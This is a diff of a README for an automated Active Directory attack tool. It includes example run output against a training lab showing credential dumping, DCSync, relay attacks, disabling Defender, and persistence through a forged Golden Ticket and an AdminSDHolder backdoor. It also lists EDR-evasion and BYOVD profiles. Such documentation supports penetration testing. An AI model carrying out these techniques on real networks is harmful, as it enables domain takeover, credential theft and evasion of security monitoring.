@@ -71,154 +71,88 @@ adpack validate                        # Test credentials across protocols
 adpack run lateral -t 10.0.0.6         # Lateral movement
 ```
 
-**Example output from GOAD-Light (2026-05-20):**
+**Example output (GOAD-Light, 2026-05-28):**
 
 ```
   ────────────────────────────────────────────────────
   AUTO-RUN  ·  Automated Attack Chain
-  Target:  192.168.57.10
-  Limit:   9 phases
+  Target:  192.168.57.22
   ────────────────────────────────────────────────────
 
-  →  Seeded creds: sevenkingdoms.local\Administrator
-  [1]  DISCOVERY
-      No hosts found. Run nmap sweep or specify targets.
-
-[+] Host added from target flag: 192.168.57.10
-      ✓  1 host(s) discovered
-         ·  192.168.57.10 [DC]
-
-      ✓ complete  ·  851ms
-
-  [2]  ENUMERATION
-      Hosts=1, Users=0, Computers=0. Enumerate AD objects via LDAP or NetExec.
-
-[*] Enumerating users on 192.168.57.10 (sevenkingdoms.local)...
-[+] Enumerated 15 users
-      ✓  15 user(s) enumerated
-
-      ✓ complete  ·  1.026s
-
-  [3]  CREDENTIAL_ACQ
-      Users=15, Creds=1. Try Kerberoast, AS-REP, spray, LSASS.
-
-      →  Kerberos pre-check...
-[*] AS-REP roasting against 192.168.57.10...
-[+] AS-REP: 0 roastable users found
-[*] Kerberoasting against 192.168.57.10...
-[+] Kerberoast: 1 SPN accounts found
-[*] Using evasion profile: standard
-[*] Target: 192.168.57.10 (KINGSLANDING)
-[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...
-[*] DCSync via impacket-secretsdump against 192.168.57.10...
-[+] Secretsdump: 17 credentials found
-      ✓  17 credential(s) acquired
-         ·  sevenkingdoms.local\Administrator  c66d72021a2d4744409969a581a1705e
-         ·  sevenkingdoms.local\Guest          31d6cfe0d16ae931b73c59d7e0c089c0
-         ·  sevenkingdoms.local\krbtgt         95adcbce290dd623b98f9e6907287d8f
-
-      ✓ complete  ·  1.28s
-
-  [4]  SESSION_HARVEST
-      Validated creds but no sessions. Hunt sessions via NetExec SMB/LDAP.
-
-[*] Harvesting sessions...
-         host identity unresolved (non-machine or empty): sevenkingdoms.local\Administrator
-[+] Identity drift snapshot: {"resolved":0,"unresolved":1,...}
-[+] Harvested 1 sessions
-      ✓  1 session(s) harvested
-
-      ✓ complete  ·  1.046s
-
-  [5]  GRAPH_ANALYSIS
-      Enumerated data collected. Run BloodHound for attack paths.
-
-[*] Enumerating computers...
-[+] 1 computers enumerated
-[*] Enumerating GPOs...
-[*] LDAP GPO listing empty, trying ldapsearch fallback...
-[+] 2 GPOs enumerated
-[*] Enumerating ADCS certificate templates...
-[+] 2 ADCS templates found
-      ✓  1 computer(s), 2 GPO(s), 2 ADCS template(s)
-
-      ✓ complete  ·  2.696s
-
-  [6]  LATERAL
-      Creds+sessions ready. Move laterally via WinRM/WMI/PSExec.
-
-[*] Trying SMB on 192.168.57.10...
-  ✓  SMB succeeded
-[*] Trying PSExec on 192.168.57.10...
-  ✓  PSExec succeeded
-[*] Trying Schtasks on 192.168.57.10...
-  ✓  Schtasks succeeded
-[*] Trying WMI on 192.168.57.10...
-  ✓  WMI succeeded
-[*] Trying WinRM on 192.168.57.10...
-  ✓  WinRM succeeded
-
-      ✓ complete  ·  47.672s
-
-  [7]  VALIDATION
-      18 creds to validate. Test auth via SMB/LDAP/WinRM.
-
-[*] Validating 18 credentials against 1 hosts...
-[*] Skipping already validated: sevenkingdoms.local\Administrator
-[*] [2/18] Validating sevenkingdoms.local\Administrator
-  [+] Valid on: SMB, LDAP, WinRM [ADMIN]
-  [+] Accessible hosts: 1
-[*] [3/18] Validating sevenkingdoms.local\Guest
-  [+] Valid on: SMB, LDAP, WinRM
-  [+] Accessible hosts: 1
-[*] [4/18] Validating sevenkingdoms.local\krbtgt
-  [+] Valid on: SMB, LDAP, WinRM
-  [+] Accessible hosts: 1
-...
-[*] [18/18] Validating sevenkingdoms.local\NORTH$
-  [+] Valid on: SMB, LDAP, WinRM
-  [+] Accessible hosts: 1
-[+] Validation complete: 17/18 valid (3 admin)
-
-      ✓ complete  ·  49.952s
-
-  [8]  PRIVESC
-      Check ACL abuse, ADCS, RBCD, GPP for privilege escalation.
-
-[*] Checking GPP passwords in SYSVOL...
-[*] Checking ACL abuse paths...
-[*] Checking ADCS vulnerable templates...
-[+] ADCS output: LDAP 192.168.57.10 389 KINGSLANDING
-     [+] sevenkingdoms.local\Administrator:8dCT-DJjgScp (Pwn3d!)
-     ADCS Found PKI Enrollment Server: kingslanding.sevenkingdoms.local
-     ADCS Found CN: SEVENKINGDOMS-CA
-[*] Checking RBCD...
-[+] SYSTEM access confirmed on 192.168.57.10 (smbexec)
-      ✓  Privesc checks completed
-
-      ✓ complete  ·  14.127s
-
-  [9]  PERSISTENCE
-      Establish persistence: krbtgt, DSRM, skeleton, admin SDHolder.
-
-[*] Creating scheduled task persistence (onlogon, SYSTEM)...
-[+] Scheduled task created via wmiexec
-[*] Enabling DSRM password-reuse logon (registry)...
-[+] DSRM logon behavior set to 2 via wmiexec
-[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...
-[+] Golden Ticket forged: /tmp/golden_svc_health_1779315159.ccache
-    use: export KRB5CCNAME=/tmp/golden_svc_health_1779315159.ccache
-[*] Backdooring AdminSDHolder (GenericAll → SDProp propagation)...
-[+] AdminSDHolder GenericAll granted to Administrator (impacket-dacledit)
-[+] 4 persistence mechanism(s) deployed
-      ✓  Persistence mechanisms deployed
-
-      ✓ complete  ·  24.912s
-
-
-  ■  Limit reached (9 phases executed)
   ────────────────────────────────────────────────────
-  ■  9 phases executed  ·  1 hosts  ·  15 users  ·  18 creds (17 validated)
+  [1] DISCOVERY  No hosts found. Run nmap sweep or specify targets.
+  ────────────────────────────────────────────────────
+  [+] Host added from target flag: 192.168.57.22
+  ✓  1 host(s) discovered
+    ·  192.168.57.22
+
+  ✓  complete  ·  8.782s
+
+  ────────────────────────────────────────────────────
+  [2] ENUMERATION  Hosts=3, Users=21, Computers=4.
+  ────────────────────────────────────────────────────
+  ✓  16 user(s) enumerated
+  ✓  1 credential(s) found in descriptions
+
+  ✓  complete  ·  1.072s
+
+  ... (phases 3-7: credential_acq, session_harvest,
+       graph_analysis, lateral, validation) ...
+
+  ────────────────────────────────────────────────────
+  [8] PRIVESC  Check ACL abuse, ADCS, RBCD, GPP.
+  ────────────────────────────────────────────────────
+  ✓  Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)
+  ✓  NTLM relay started on 0.0.0.0 → ldap://192.168.57.22
+  ✓  ESC8 relay started → http://192.168.57.22/certsrv/certfnsh.asp
+  ▸  Checking GPP passwords in SYSVOL...
+  ▸  Checking ADCS vulnerable templates...
+  ▸  Enumerating ACL privilege edges (daclread)...
+  ✓  1 MSSQL privilege edge(s) found
+    samwell.tarly → MSSQL_XP_CMDSHELL → SYSTEM@192.168.57.22
+  ✓  33 ADCS template(s) found (ESC1, ESC8, ESC13)
+  ✓  1 delegation edge(s) found
+  ✓  BloodHound merged: 21 users, 51 groups, 4 computers
+
+  [+] SYSTEM access confirmed on 192.168.57.22 (smbexec)
+  ✓  SAM dump: Administrator, WDAGUtilityAccount, vagrant
+  ✓  LSA dump: robb.stark DCC2, CASTELBLACK$ machine hash
+  ▸  Deploying UnDefend.exe --kill to disable Defender...
+  ✓  UnDefend --kill executed (Defender disabled)
+  ▸  Deep credential dump (post-evasion)...
+  →  No additional creds from deep dump (SAM/LSA already captured)
+
+  ✓  complete  ·  33.6s
+
+  ────────────────────────────────────────────────────
+  [9] PERSISTENCE  Establish persistence.
+  ────────────────────────────────────────────────────
+  ✓  Scheduled task created (onlogon, SYSTEM)
+  ✓  Persistence mechanisms deployed
+
+  ✓  complete  ·  1.6s
+
+  ■  9 phases  ·  3 hosts  ·  21 users  ·  5 creds (4 validated)
+
+  ────────────────────────────────────────────────────────
+  LOOT SUMMARY
+  ────────────────────────────────────────────────────────
+  CREDENTIALS  (5 total, 4 validated)
+    ·  north\samwell.tarly  Heartsbane  ✓
+    ·  north\Administrator  dbd13e1c...  ✓
+    ·  north\vagrant  e02bc503...  ✓
+    ·  north\WDAGUtilityAccount  9ab6e30...  ✓
+    ·  north\brandon.stark  $krb5asrep$...  ?
+
+  VULNERABILITY COVERAGE
+    ●  SYSTEM Access  [1 hosts]
+    ●  Domain Admin  [1 creds]
+    ●  xp_cmdshell  [1 edges]
+    ●  ESC1  [1 edges]
+    ●  ESC8  [33 templates]
+    ●  Unconstrained Delegation  [1 edges]
+    ●  Dangerous ACLs  [299 edges]
+    ●  Backdoors  Deployed
 ```
 
 
@@ -233,15 +167,16 @@ adpack run lateral -t 10.0.0.6         # Lateral movement
 - TUI dashboard and JSON export
 
 ### Credential Operations
-- LSASS dumping via nanodump with 11+ evasion pipelines (fork, snapshot, WER, BOF, BYOVD, coldwer, MiniPlasma) and automatic fallback to DCSync via impacket-secretsdump
-- Kerberoasting and AS-REP roasting
-- Multi-protocol validation (SMB, LDAP, WinRM, RDP)
+- Cascading deep credential dump: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA (graceful degradation)
+- Automatic AV evasion: UnDefend --kill deploys post-SYSTEM, no profile flag needed
+- Kerberoasting and AS-REP roasting with automatic hash capture
+- Multi-protocol validation (SMB, LDAP, WinRM, RDP) — skips hash-only creds
 - Detects admin rights and checks if lateral movement works
 
 ### Evasion 
 - 13 profiles from basic to advanced techniques
-- Orchestrates Nightmare Eclipse methods (BlueHammer, UnDefend)
-- BYOVD kernel access and EDR freezing workflows
+- Automatic AV kill via UnDefend --kill (aggressive mode) after SYSTEM access
+- BYOVD kernel access (PhantomKiller) and EDR freezing (ColdWer) workflows
 - In-memory execution via Donut and BOF integration
 
 ### Automation
@@ -300,13 +235,13 @@ adpack run lateral -t 10.0.0.6         # Lateral movement
 |---------|-----------|:--------------:|----------|
 | `minimal` | Donut + go-mimikatz | 🟡 Medium | Lab environments |
 | `standard` | Donut + go-mimikatz (remote) | 🟡 Medium | Enterprise with Defender |
-| `aggressive` | BOF + nanodump | 🟢 Low | C2 integration |
-| `bypass` | Multi-stack evasion with pre-flight | 🟢 Low | Full chain runs |
+| `aggressive` | Full evasion stack (syscalls, PPID spoof, sleep mask) | 🟢 Low | Mature EDR environments |
+| `bypass` | Aggressive stack + Defender neutralisation pre-flight | 🟢 Low | Full chain with AV kill |
 | `bof` | BOF injection (standalone) | 🟢 Low | In-memory execution |
 | `fork` | nanodump --fork | 🟢 Low | LSASS process cloning |
 | `byovd` | RTCore64.sys | 🟢 Very Low | Kernel-level PPL bypass |
 | `coldwer` | EDR-Freeze | 🟢 Very Low | EDR blind spot |
-| `undefend` | UnDefend | 🟢 Low | Defender termination |
+| `undefend` | UnDefend --kill (automatic post-SYSTEM) | 🟢 Low | Defender termination + LSASS dump |
 | `bluehammer` | CVE-2026-33825 | 🟢 Very Low | Unprivileged SAM dump (requires Windows VS 2022 build) |
 | `phantomkiller` | BootRepair.sys BYOVD | 🟢 Very Low | PPL-protected EDR kill |
 | `miniplasma` | Cloud Filter EoP (CVE-2020-17103) | 🟢 Very Low | Kernel-adjacent SYSTEM path, independent of service/task primitives |
@@ -380,7 +315,7 @@ source ~/.bashrc
 <table>
 <tr>
 <td><strong>Installs</strong></td>
-<td>Go 1.25+, NetExec, Donut, go-mimikatz, pypykatz, ScareCrow, nanodump, adpack binary, default config. Clones and builds evasion tool binaries (UnDefend, BlueHammer, PhantomKiller, MiniPlasma) where build toolchains are available.</td>
+<td>Go 1.25+, NetExec, Donut, pypykatz, nanodump, adpack binary, default config. Clones and builds evasion tool binaries (UnDefend, PhantomKiller, MiniPlasma) where build toolchains are available. go-mimikatz requires Windows build (falls back to nanodump+pypykatz automatically).</td>
 </tr>
 <tr>
 <td><strong>Time</strong></td>
